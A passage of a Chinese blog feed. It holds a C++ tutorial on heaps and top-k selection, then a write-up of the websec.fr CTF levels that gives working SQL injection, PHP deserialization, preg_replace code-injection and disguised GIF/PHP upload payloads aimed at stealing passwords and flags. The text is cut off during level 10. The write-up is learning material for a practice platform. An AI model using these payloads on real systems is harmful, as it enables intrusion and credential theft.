元素入堆 */</span><br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br>maxHeap.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);<br><br><span class="hljs-comment">/* 获取堆顶元素 */</span><br><span class="hljs-type">int</span> peek = maxHeap.<span class="hljs-built_in">top</span>(); <span class="hljs-comment">// 5</span><br><br><span class="hljs-comment">/* 堆顶元素出堆 */</span><br><span class="hljs-comment">// 出堆元素会形成一个从大到小的序列</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 5</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 4</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 3</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 2</span><br>maxHeap.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">/* 获取堆大小 */</span><br><span class="hljs-type">int</span> size = maxHeap.<span class="hljs-built_in">size</span>();<br><br><span class="hljs-comment">/* 判断堆是否为空 */</span><br><span class="hljs-type">bool</span> isEmpty = maxHeap.<span class="hljs-built_in">empty</span>();<br><br><span class="hljs-comment">/* 输入列表并建堆 */</span><br>vector&lt;<span class="hljs-type">int</span>&gt; input&#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>&#125;;<br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">minHeap</span>(input.<span class="hljs-built_in">begin</span>(), input.<span class="hljs-built_in">end</span>());<br></code></pre></td></tr></table></figure><h5 id="堆的实现"><a href="#堆的实现" class="headerlink" title="堆的实现"></a>堆的实现</h5><p>“二叉树”章节讲过，完全二叉树非常适合用数组来表示。由于堆正是一种完全二叉树，<strong>因此我们将采用数组来存储堆</strong>。</p><p>当使用数组表示二叉树时，元素代表节点值，索引代表节点在二叉树中的位置。<strong>节点指针通过索引映射公式来实现</strong>。</p><p>如图所示，给定索引 $i$，其左子节点的索引为 $2i+1$，右子节点的索引为 $2i+2$，父节点的索引为 $(i-1)&#x2F;2$（向下整除）。当索引越界时，表示空节点或节点不存在。</p><p><img src="https://www.hello-algo.com/chapter_heap/heap.assets/representation_of_heap.png" srcset="/img/loading.gif" lazyload></p><p>给定元素 <code>val</code> ，我们首先将其添加到堆底。添加之后，由于 <code>val</code> 可能大于堆中其他元素，堆的成立条件可能已被破坏，<strong>因此需要修复从插入节点到根节点的路径上的各个节点</strong>，这个操作被称为堆化（heapify）。</p><p>考虑从入堆节点开始，<strong>从底至顶执行堆化</strong>。我们比较插入节点与其父节点的值，如果插入节点更大，则将它们交换。然后继续执行此操作，从底至顶修复堆中的各个节点，直至越过根节点或遇到无须交换的节点时结束。</p><p>设节点总数为 $n$，则树的高度为 $O(logn)$。由此可知，堆化操作的循环轮数最多为 $O(logn)$，<strong>元素入堆操作的时间复杂度为</strong> $O(logn)$。代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 元素入堆 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> </span>&#123;<br>    <span class="hljs-comment">// 添加节点</span><br>    maxHeap.<span class="hljs-built_in">push_back</span>(val);<br>    <span class="hljs-comment">// 从底至顶堆化</span><br>    <span class="hljs-built_in">siftUp</span>(<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/* 从节点 i 开始，从底至顶堆化 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">siftUp</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// 获取节点 i 的父节点</span><br>        <span class="hljs-type">int</span> p = <span class="hljs-built_in">parent</span>(i);<br>        <span class="hljs-comment">// 当“越过根节点”或“节点无须修复”时，结束堆化</span><br>        <span class="hljs-keyword">if</span> (p &lt; <span class="hljs-number">0</span> || maxHeap[i] &lt;= maxHeap[p])<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// 交换两节点</span><br>        <span class="hljs-built_in">swap</span>(maxHeap[i], maxHeap[p]);<br>        <span class="hljs-comment">// 循环向上堆化</span><br>        i = p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>堆顶元素是二叉树的根节点，即列表首元素。如果我们直接从列表中删除首元素，那么二叉树中所有节点的索引都会发生变化，这将使得后续使用堆化进行修复变得困难。为了尽量减少元素索引的变动，我们采用以下操作步骤。</p><ol><li>交换堆顶元素与堆底元素（交换根节点与最右叶节点）。</li><li>交换完成后，将堆底从列表中删除（注意，由于已经交换，因此实际上删除的是原来的堆顶元素）。</li><li>从根节点开始，<strong>从顶至底执行堆化</strong>。</li></ol><p>与元素入堆操作相似，堆顶元素出堆操作的时间复杂度也为 $O(logn)$。代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 元素出堆 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 判空处理</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEmpty</span>()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;堆为空&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 交换根节点与最右叶节点（交换首元素与尾元素）</span><br>    <span class="hljs-built_in">swap</span>(maxHeap[<span class="hljs-number">0</span>], maxHeap[<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">// 删除节点</span><br>    maxHeap.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-comment">// 从顶至底堆化</span><br>    <span class="hljs-built_in">siftDown</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* 从节点 i 开始，从顶至底堆化 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// 判断节点 i, l, r 中值最大的节点，记为 ma</span><br>        <span class="hljs-type">int</span> l = <span class="hljs-built_in">left</span>(i), r = <span class="hljs-built_in">right</span>(i), ma = i;<br>        <span class="hljs-keyword">if</span> (l &lt; <span class="hljs-built_in">size</span>() &amp;&amp; maxHeap[l] &gt; maxHeap[ma])<br>            ma = l;<br>        <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-built_in">size</span>() &amp;&amp; maxHeap[r] &gt; maxHeap[ma])<br>            ma = r;<br>        <span class="hljs-comment">// 若节点 i 最大或索引 l, r 越界，则无须继续堆化，跳出</span><br>        <span class="hljs-keyword">if</span> (ma == i)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-built_in">swap</span>(maxHeap[i], maxHeap[ma]);<br>        <span class="hljs-comment">// 循环向下堆化</span><br>        i = ma;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="建堆操作"><a href="#建堆操作" class="headerlink" title="建堆操作"></a>建堆操作</h4><h5 id="借助入堆操作实现"><a href="#借助入堆操作实现" class="headerlink" title="借助入堆操作实现"></a>借助入堆操作实现</h5><p>我们首先创建一个空堆，然后遍历列表，依次对每个元素执行“入堆操作”，即先将元素添加至堆的尾部，再对该元素执行“从底至顶”堆化。</p><p>每当一个元素入堆，堆的长度就加一。由于节点是从顶到底依次被添加进二叉树的，因此堆是“自上而下”构建的。</p><p>设元素数量为 $n$，每个元素的入堆操作使用 $O(logn)$时间，因此该建堆方法的时间复杂度为 $O(nlogn)$。</p><h5 id="通过遍历堆化实现"><a href="#通过遍历堆化实现" class="headerlink" title="通过遍历堆化实现"></a>通过遍历堆化实现</h5><p>实际上，我们可以实现一种更为高效的建堆方法，共分为两步。</p><ol><li>将列表所有元素原封不动地添加到堆中，此时堆的性质尚未得到满足。</li><li>倒序遍历堆（层序遍历的倒序），依次对每个非叶节点执行“从顶至底堆化”。</li></ol><p><strong>每当堆化一个节点后，以该节点为根节点的子树就形成一个合法的子堆</strong>。而由于是倒序遍历，因此堆是“自下而上”构建的。</p><p>之所以选择倒序遍历，是因为这样能够保证当前节点之下的子树已经是合法的子堆，这样堆化当前节点才是有效的。</p><p>值得说明的是，<strong>由于叶节点没有子节点，因此它们天然就是合法的子堆，无须堆化</strong>。如以下代码所示，最后一个非叶节点是最后一个节点的父节点，我们从它开始倒序遍历并执行堆化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 构造方法，根据输入列表建堆 */</span><br><span class="hljs-built_in">MaxHeap</span>(vector&lt;<span class="hljs-type">int</span>&gt; nums) &#123;<br>    <span class="hljs-comment">// 将列表元素原封不动添加进堆</span><br>    maxHeap = nums;<br>    <span class="hljs-comment">// 堆化除叶节点以外的其他所有节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-built_in">parent</span>(<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>); i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">siftDown</span>(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考：<a href="https://www.hello-algo.com/chapter_heap/build_heap">https://www.hello-algo.com/chapter_heap/build_heap</a></p><p><strong>输入列表并建堆的时间复杂度为 $O(n)$，非常高效</strong>。</p><h4 id="用堆解决Top-k问题"><a href="#用堆解决Top-k问题" class="headerlink" title="用堆解决Top-k问题"></a>用堆解决Top-k问题</h4><p>给定一个长度为 的无序数组 <code>nums</code> ，请返回数组中最大的 $k$ 个元素。</p><p>我们可以基于堆更加高效地解决 Top-k 问题，流程下所示。</p><ol><li>初始化一个小顶堆，其堆顶元素最小。</li><li>先将数组的前 $k$ 个元素依次入堆。</li><li>从第 $k+1$ 个元素开始，若当前元素大于堆顶元素，则将堆顶元素出堆，并将当前元素入堆。</li><li>遍历完成后，堆中保存的就是最大的 $k$ 个元素。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于堆查找数组中最大的 k 个元素 */</span><br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">topKHeap</span>(vector&lt;<span class="hljs-type">int</span>&gt; &amp;nums, <span class="hljs-type">int</span> k) &#123;<br>    <span class="hljs-comment">// 初始化小顶堆</span><br>    priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; heap;<br>    <span class="hljs-comment">// 将数组的前 k 个元素入堆</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>        heap.<span class="hljs-built_in">push</span>(nums[i]);<br>    &#125;<br>    <span class="hljs-comment">// 从第 k+1 个元素开始，保持堆的长度为 k</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = k; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        <span class="hljs-comment">// 若当前元素大于堆顶元素，则将堆顶元素出堆、当前元素入堆</span><br>        <span class="hljs-keyword">if</span> (nums[i] &gt; heap.<span class="hljs-built_in">top</span>()) &#123;<br>            heap.<span class="hljs-built_in">pop</span>();<br>            heap.<span class="hljs-built_in">push</span>(nums[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> heap;<br>&#125;<br></code></pre></td></tr></table></figure><p>总共执行了 $n$ 轮入堆和出堆，堆的最大长度为 $k$，因此时间复杂度为 $O(nlogk)$。该方法的效率很高，当 $k$ 较小时，时间复杂度趋向 $O(n)$；当 $k$ 较大时，时间复杂度不会超过 $O(nlogn)$。</p><p>另外，该方法适用于动态数据流的使用场景。在不断加入数据时，我们可以持续维护堆内的元素，从而实现最大的 $k$ 个元素的动态更新。</p><h5 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h5><p><strong>Q</strong>：数据结构的“堆”与内存管理的“堆”是同一个概念吗？</p><p>两者不是同一个概念，只是碰巧都叫“堆”。计算机系统内存中的堆是动态内存分配的一部分，程序在运行时可以使用它来存储数据。程序可以请求一定量的堆内存，用于存储如对象和数组等复杂结构。当这些数据不再需要时，程序需要释放这些内存，以防止内存泄漏。相较于栈内存，堆内存的管理和使用需要更谨慎，使用不当可能会导致内存泄漏和野指针等问题。</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Websec Writeup</title>
    <link href="/2024/07/18/Websec-Writeup/"/>
    <url>/2024/07/18/Websec-Writeup/</url>
    
    <content type="html"><![CDATA[<p>平台：<a href="https://websec.fr/">https://websec.fr/</a></p><h3 id="level-01"><a href="#level-01" class="headerlink" title="level 01"></a>level 01</h3><p>一道SQLite整型注入的题目，找到注入方法后可以查看表结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">-1 union select name,sql from sqlite_master<br></code></pre></td></tr></table></figure><p>再尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">-1 union select username,password from users where id=1<br></code></pre></td></tr></table></figure><p>即可获取到flag。</p><h3 id="level-02"><a href="#level-02" class="headerlink" title="level 02"></a>level 02</h3><p>前一题基础上加了一个双写绕过，不再赘述。</p><h3 id="level-03"><a href="#level-03" class="headerlink" title="level 03"></a>level 03</h3><p>这么长的hash值要是能碰撞出来就不是发writeup而是发paper了，所以处理函数一定有问题。首先<code>password_verify</code>函数用于验证密码是否和hash值匹配，这里不存在弱类型或是传递数组绕过，只能老老实实让<code>sha1($flag, fa1se)</code>和 <code>sha1($h2)</code>相等。这里会发现false故意拼写错了，就会被解析成true，在PHP里，<code>sha1(string, raw)</code>函数的语法为：</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必须，规定需要进行运算的字符</td></tr><tr><td>raw</td><td>可选，默认为false，函数将返回一个 40 字符长的十六进制字符串，当设置为true时函数将返回一个 20 字节长的二进制字符串（原始二进制格式）</td></tr></tbody></table><p>同时，注意到提供给我们的hash的第二个字节为<code>0x00</code>，对应终止符<code>\0</code>，所以检验函数不会匹配00后面的内容。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Here is the hash of your flag: <span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">00249</span>d<span class="hljs-number">409</span>a<span class="hljs-number">91</span>ab<span class="hljs-number">84e3</span>f<span class="hljs-number">421</span><span class="hljs-keyword">c</span><span class="hljs-number">193520</span>d<span class="hljs-number">9</span>fb<span class="hljs-number">3674</span>b<br></code></pre></td></tr></table></figure><p>因此，我们只需要找到一个字符的sha1值开头是<code>7c00</code>，即可通过验证。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    a = hashlib.sha1(<span class="hljs-built_in">str</span>(i).encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> a.startswith(<span class="hljs-string">&quot;7c00&quot;</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>    i += <span class="hljs-number">1</span><br><span class="hljs-comment">#104610</span><br></code></pre></td></tr></table></figure><h3 id="level-04"><a href="#level-04" class="headerlink" title="level 04"></a>level 04</h3><p>提供了源代码，关键代码在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;leet_hax0r&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$sess_data</span> = <span class="hljs-title function_ invoke__">unserialize</span> (<span class="hljs-title function_ invoke__">base64_decode</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;leet_hax0r&#x27;</span>]));<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$sess_data</span>) &amp;&amp; <span class="hljs-variable">$sess_data</span>[<span class="hljs-string">&#x27;ip&#x27;</span>] != <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;CANT HACK US!!!&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-title function_ invoke__">base64_encode</span> (<span class="hljs-title function_ invoke__">serialize</span> (<span class="hljs-keyword">array</span> ( <span class="hljs-string">&#x27;ip&#x27;</span> =&gt; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]))) ;<br>    <span class="hljs-title function_ invoke__">setcookie</span> (<span class="hljs-string">&#x27;leet_hax0r&#x27;</span>, <span class="hljs-variable">$cookie</span>, <span class="hljs-title function_ invoke__">time</span> () + (<span class="hljs-number">86400</span> * <span class="hljs-number">30</span>));<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$conn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span> (<span class="hljs-string">&quot;database.db&quot;</span>, SQLITE3_OPEN_READONLY);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SQL_query</span>(<span class="hljs-params"><span class="hljs-variable">$query</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-variable">$query</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span> (<span class="hljs-variable">$this</span>-&gt;query);<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>构造一个简单的反序列化，将base64编码结果填入到cookie中即可拿到flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$conn</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-string">&quot;SELECT GROUP_CONCAT(password) as username from users;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$inst</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SQL</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$inst</span>)));<br></code></pre></td></tr></table></figure><h3 id="level-05"><a href="#level-05" class="headerlink" title="level 05"></a>level 05</h3><p>首先查看关键代码，程序获得我们的输入，并匹配黑名单，因此我们的命令不能使用引号、括号和反引号，用payload绕过即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$q</span> = <span class="hljs-title function_ invoke__">substr</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;q&#x27;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-title function_ invoke__">implode</span> ([<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>]);<br><span class="hljs-variable">$corrected</span> = <span class="hljs-title function_ invoke__">preg_replace</span> (<span class="hljs-string">&quot;/([^<span class="hljs-subst">$blacklist</span>]&#123;2,&#125;)/ie&quot;</span>, <span class="hljs-string">&#x27;correct (&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$q</span>);<br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span>include_once<span class="hljs-variable">$_GET</span>[inc]&#125; <span class="hljs-variable">$&#123;</span>flag&#125;<br></code></pre></td></tr></table></figure><p>同时在url中添加<code>inc=flag.php</code>。</p><h3 id="level-08"><a href="#level-08" class="headerlink" title="level 08"></a>level 08</h3><p>首先可以搜索一下<code>exif_imagetype()</code>函数的匹配原理，它会读取文件的第一个字节并检查其签名，只要加上magic字符就绕过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;.&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br><span class="hljs-comment">// show_source(&#x27;flag.txt&#x27;)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里可能是禁用了一些命令的回显，测试了system函数看不到输出结果，改用PHP的方法打印路径文件并读取成功拿到了flag。</p><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>首先查看一下获取flag的方法，需要我们输入一个hash值和一个文件名，如果相等则会访问我们输入的文件名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hash&#x27;</span>])) &#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$request</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hash&#x27;</span>];<br><br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">substr</span> (<span class="hljs-title function_ invoke__">md5</span> (<span class="hljs-variable">$flag</span> . <span class="hljs-variable">$file</span> . <span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>, <span class="hljs-number">8</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span 